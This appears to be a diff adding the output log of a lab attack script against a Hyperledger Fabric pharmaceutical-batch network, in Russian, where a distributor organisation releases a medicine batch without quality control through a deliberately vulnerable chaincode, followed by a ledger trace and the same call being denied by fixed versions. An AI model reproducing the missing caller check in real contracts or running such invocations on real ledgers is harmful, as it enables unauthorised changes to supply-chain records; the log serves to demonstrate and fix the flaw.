@@ -1,0 +1,25 @@
+$ bash network/scripts/attack_vuln.sh
+==> Подготовка: Org1 (production) создаёт партию BATCH-V-001 в medicinebatch_vuln — контроль качества не проводился
+txid [a340c995f143181c8c3723dc9ebba121e347825302eb74530dcc1426dd9d13cc] committed with status (VALID) at localhost:7051
+Состояние до атаки: BATCH-V-001: status=CREATED holder=Org1MSP
+==> АТАКА: Org2 (logistics@org2, дистрибьютор) выпускает партию в обращение без контроля качества
+$ peer chaincode invoke -n medicinebatch_vuln -c '{"function":"UpdateStatus","Args":["BATCH-V-001","RELEASED"]}'  (MSP: Org2MSP)
+txid [3801cc3b5960952292bb70efc4bbc886ff1adcf547a5efdad73fe6f2a6c78fa2] committed with status (VALID) at localhost:9051
+txid [3801cc3b5960952292bb70efc4bbc886ff1adcf547a5efdad73fe6f2a6c78fa2] committed with status (VALID) at localhost:7051
+ATTACK_TXID=3801cc3b5960952292bb70efc4bbc886ff1adcf547a5efdad73fe6f2a6c78fa2
+Состояние после атаки: BATCH-V-001: status=RELEASED holder=Org1MSP
+==> Проверка, кем подписана и подтверждена транзакция атаки (блок из ledger)
+TxID: 3801cc3b5960952292bb70efc4bbc886ff1adcf547a5efdad73fe6f2a6c78fa2
+1. Proposal:    клиент Org2MSP подписал предложение 2026-10-29T10:06:40.585522425Z; chaincode=medicinebatch_vuln v1.0, args=['UpdateStatus', 'BATCH-V-001', 'RELEASED']
+2. Endorsement: подтверждения от ['Org1MSP', 'Org2MSP'] (политика AND('Org1MSP.peer','Org2MSP.peer')); ответ chaincode: status=200
+     ReadSet  [_lifecycle] key=namespaces/fields/medicinebatch_vuln/Sequence version=(block 14, tx 0)
+     ReadSet  [medicinebatch_vuln] key=BATCH-V-001 version=(block 18, tx 0)
+     WriteSet [medicinebatch_vuln] key=BATCH-V-001 → status=RELEASED
+3. Ordering:    orderer (Raft) включил транзакцию в блок #19 (позиция 0); Writing block [19] (Raft index: 21) to ledger channel=pharmachannel node=1
+4. Validation:  код в TRANSACTIONS_FILTER блока = 0 (VALID); VSCC проверил политику подтверждения, MVCC — версии ReadSet
+5. Commit:      peer0.org1: [pharmachannel] Committed block [19] with 1 transaction(s) in 2ms (state_validation=0ms block_and_pvtdata_commit=1ms state_commit=0ms) commitHash=[e595cae3aa857df7a40c2777be8b6fb21db4698c4cf8cea8722f2e5cc14d144f]
+5. Commit:      peer0.org2: [pharmachannel] Committed block [19] with 1 transaction(s) in 2ms (state_validation=0ms block_and_pvtdata_commit=1ms state_commit=0ms) commitHash=[e595cae3aa857df7a40c2777be8b6fb21db4698c4cf8cea8722f2e5cc14d144f]
+==> Та же атака против исправленных версий
+-- medicinebatch (v1, проверка MSP):  message:"access denied: operation requires Org1MSP, caller is Org2MSP"
+-- medicinebatch_secure:              message:"access denied: operation requires Org1MSP, caller is Org2MSP"
+Состояние BATCH-V-001 в medicinebatch_secure: BATCH-V-001: status=CREATED holder=Org1MSP
